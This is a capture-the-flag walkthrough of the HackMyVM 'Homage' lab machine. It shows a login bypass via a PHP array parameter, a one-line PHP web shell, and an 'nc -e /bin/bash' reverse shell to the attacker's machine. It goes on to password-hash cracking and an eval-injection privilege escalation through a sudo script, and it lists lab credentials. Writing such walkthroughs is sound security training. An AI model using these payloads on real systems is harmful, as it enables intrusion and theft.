@@ -1,0 +1,286 @@
+---
+title: "Homage - HackMyVM Walkthrough"
+---
+nmap service scan:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/homage]
+└─$ nmap -p- -sV 192.168.56.254 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-09 11:41 EST
+--SNIP--
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+{% endhighlight %}
+
+Upon visiting the website we're presented with a login form on the page. 
+We'll need to intercept the index.php request with Burp, edit the values and add 
+`[]` square braces to the password field. 
+
+Vulnerability details found here: https://www.programmersought.com/article/66221929636/
+
+What the request looks like in BurpSuite after the changes have been made:
+
+{% highlight text %}
+POST /secret.php HTTP/1.1
+Host: 192.168.56.254
+Content-Length: 26
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.56.254
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.56.254/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+
+login=admin&password[]=admin
+{% endhighlight %}
+
+We then forward the request to the server and get the following response:
+{% highlight text %}
+Access codes :
+
+l4nr3n:thisVMsuckssomuchL0L
+
+
+
+This page is for HMV staff only. Please remember to visit it regularly as access codes are changed weekly.
+HMV thanks you for visiting.
+{% endhighlight %}
+
+Looks like we've been given an ssh login. 
+
+Logging in via SSH: 
+{% highlight terminal %}
+
+┌──(kali㉿kali)-[~/ctf/homage]
+└─$ ssh l4nr3n@192.168.56.254                                      
+The authenticity of host '192.168.56.254 (192.168.56.254)' can't be established.
+ECDSA key fingerprint is SHA256:pXCPsoEbVcXqK7gWXl+W2cTgVEcOotV7cR0FaCTTunI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.254' (ECDSA) to the list of known hosts.
+l4nr3n@192.168.56.254's password: 
+Linux homage 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jun  8 12:52:39 2021 from 192.168.0.28
+l4nr3n@homage:~$
+{% endhighlight %}
+
+### Local Enumeration & Privilege Escalation
+
+Users:
+{% highlight text %}
+root:x:0:0:root:/root:/bin/bash
+softy_hack:x:1001:1001:,,,:/home/softy_hack:/bin/bash
+l4nr3n:x:1000:1000:,,,:/home/l4nr3n:/bin/bash
+d4t4s3c:x:1002:1002:,,,:/home/d4t4s3c:/bin/bash
+sml:x:1003:1003:,,,:/home/sml:/bin/bash
+{% endhighlight %}
+We've got a few user accounts to look into. 
+
+Checking the contents of `/var/www/html`:
+{% highlight text %}
+l4nr3n@homage:/var/www/html$ ls -a
+.  ..  hmv.jpg  HMV_old_archives  index.php  secret.php
+{% endhighlight %}
+
+HMV_old_archives contains an earlier version of the site HMV started with. 
+Pretty cool. Most likely a rabbit hole though. 
+
+Kernel version isn't vulnerable to any exploits. 
+
+I uploaded linpeas.sh to do local enumeration and came up with nothing. We dont have 
+read permissions in the `var/www/html` directory, but we do have write permissions.
+Let's create a command injection php script and get a shell as www-data: 
+
+{% highlight terminal %}
+l4nr3n@homage:/var/www/html$ cat command.php 
+<?php echo system($_GET['cmd']); ?>
+{% endhighlight %}
+
+We then visit the URL and test the script:http://192.168.56.254/command.php?cmd=id
+result:uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Set up a netcat listener on port 6666 on the kali machine:
+
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/rooted/shop]
+└─$ nc -nlvp 6666                                                                1 ⨯
+listening on [any] 6666 ...
+{% endhighlight %}
+
+Execute nc -e /bin/bash/ 192.168.56.224 6666 request:
+`http://192.168.56.254/command.php?cmd=nc%20-e%20/bin/bash%20192.168.56.224%206666`
+
+After catching the connection I used grep to look for any credentials in the haystack
+of html files and found nothing. 
+The www-data user can use sudo but only with a password. 
+
+from the secret.php file: MyV3ryGreatP4ssw0rd!!! I tried it with every user and got 
+nothing. 
+
+Enumerating the `/var/www/html/HMV_old_archive`: 
+{% highlight text %}
+176K -rw-r--r-- 1 www-data www-data 176K Jun  4 12:52 183.html
+176K -rw-r--r-- 1 www-data www-data 176K Jun  4 12:52 184.html
+176K -rw-r--r-- 1 www-data www-data 176K Jun  4 12:59 185.html
+{% endhighlight %}
+
+185.html was last edited later than every other file in the directory. Each file in 
+the directory contains a hash value in the html, let's throw the one from 185.html 
+into crackstation.net. 
+
+Result: `1passwordonly`
+
+This password can be used to log in as softy_hack:
+{% highlight terminal %}
+l4nr3n@homage:~$ su softy_hack
+Password: 
+softy_hack@homage:/home/l4nr3n$
+{% endhighlight %}
+
+Checking the home directory of softy_hack we find a `.mysql_history` file containing
+the following:
+{% highlight terminal %}
+softy_hack@homage:~$ cat .mysql_history 
+show databases;
+use hmv_db
+show tables;
+show fields from hmv_users;
+select user_login,user_pass from hmv_users;
+{% endhighlight %}
+Now we have a database to take a look at.
+
+Logging into mysql server and selecting the database: 
+{% highlight terminal %}
+softy_hack@homage:~$ mysql -u softy_hack -p1passwordonly -h localhost
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 45
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+{% endhighlight %}
+
+After selecting the database and the table, we show the fields of the hmv_user table:
+{% highlight terminal %}
+MariaDB [hmv_db]> show fields from hmv_users;
++---------------------+---------------------+------+-----+---------------------+----------------+
+| Field               | Type                | Null | Key | Default             | Extra          |
++---------------------+---------------------+------+-----+---------------------+----------------+
+| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
+| user_login          | varchar(60)         | NO   | MUL |                     |                |
+| user_pass           | varchar(255)        | NO   |     |                     |                |
+| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
+| user_email          | varchar(100)        | NO   | MUL |                     |                |
+| user_url            | varchar(100)        | NO   |     |                     |                |
+| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
+| user_activation_key | varchar(255)        | NO   |     |                     |                |
+| user_status         | int(11)             | NO   |     | 0                   |                |
+| display_name        | varchar(250)        | NO   |     |                     |                |
++---------------------+---------------------+------+-----+---------------------+----------------+
+{% endhighlight %}
+
+Following that we can dump the user and password entries:
+{% highlight terminal %}
+MariaDB [hmv_db]> select user_login,user_pass from hmv_users;
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| cromiphi   | $P$BqUC2qSvJeqAm74VV8DlZ1igVSXb3Q. |
+| d4t4s3c    | $P$BRibz10RghJBstfw7PW7QKxtFRC7d/. |
++------------+------------------------------------+
+2 rows in set (0.001 sec)
+
+MariaDB [hmv_db]> 
+{% endhighlight %}
+
+I copied the hashes to a local file on my kali machine for cracking with hashcat:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/homage]
+└─$ hashcat -O -m 400 -a 0 -o hmv_users.cracked hmv_users.hash /usr/share/wordlists/rockyou.txt
+{% endhighlight %}
+
+After letting hashcat run for a while, I checked on the `hmv_users.cracked` file:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/homage]
+└─$ cat hmv_users.cracked 
+$P$BRibz10RghJBstfw7PW7QKxtFRC7d/.:jaredlee
+{% endhighlight %}
+
+This is d4t4s3c's password. let's use it to login as d4t4s3c
+
+Checking sudo command privileges:
+{% highlight terminal %}
+d4t4s3c@homage:~$ sudo -l
+Matching Defaults entries for d4t4s3c on homage:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User d4t4s3c may run the following commands on homage:
+    (sml : sml) NOPASSWD: /bin/bash /home/sml/clean.sh *
+{% endhighlight %}
+
+Running the command: 
+{% highlight terminal %}
+d4t4s3c@homage:~$ sudo -u sml /bin/bash /home/sml/clean.sh *
+listing files in /tmp
+find: ‘/tmp/tmux-1000’: Permission denied
+find: ‘/tmp/systemd-private-de511f813d404d888aa1c84c7a3f0507-systemd-timesyncd.service-JoBySH’: Permission denied
+find: ‘/tmp/systemd-private-de511f813d404d888aa1c84c7a3f0507-apache2.service-49qvdQ’: Permission denied
+find: Failed to restore initial working directory: /home/d4t4s3c: Permission denied
+{% endhighlight %}
+
+We have read permissions on the clean.sh script to let's take a look at what it does:
+{% highlight bash%}
+#!/bin/bash
+
+function_prim()
+{
+    until [ -z "$1" ]
+    do
+      if [ ${1:0:2} = '--' ]
+      then
+          tmp=${1:2}
+          parameter=${tmp%%=*}
+          value=${tmp##*=}
+          eval $parameter=$value
+      fi
+      shift
+    done
+}
+
+target=/tmp
+
+# Pass all options to getopt_simple().
+function_prim $*
+
+# list files to clean
+echo "listing files in $target"
+find "$target" -mtime 1
+{% endhighlight %}
+
+In order to exploit this script we run the following command. 
+{% highlight terminal %}
+d4t4s3c@homage:~$ sudo -u sml /bin/bash /home/sml/clean.sh '--redteam=foo;/bin/bash'
+sml@homage:/home/d4t4s3c$
+{% endhighlight %}
+
+in order to get root we need to run a program called execute_me in a malbolge 
+interpreter. After running, we get the root password:
+`root:cr4zyw0rld123`
+
+Get all the flags, submit for points. Hooray for points. 
